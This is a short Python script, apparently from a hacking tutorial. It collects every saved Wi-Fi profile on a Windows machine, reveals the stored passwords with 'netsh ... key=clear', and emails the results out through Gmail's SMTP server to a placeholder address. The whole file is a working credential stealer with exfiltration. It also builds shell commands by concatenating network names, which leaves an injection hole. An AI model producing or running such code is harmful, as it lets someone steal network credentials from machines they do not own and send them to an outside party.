import subprocess, smtplib, re


def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True).decode("utf-8")
network_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks)
network_names_string = ' '.join(network_names_list)

result = ""
for network_name in network_names_list:
    command = "netsh wlan show profile " + network_name + " key=clear"
    current_result = subprocess.check_output(command, shell=True).decode("utf-8")
    result = str(result) + str(current_result)

send_mail("your@mail", "password", str(result))
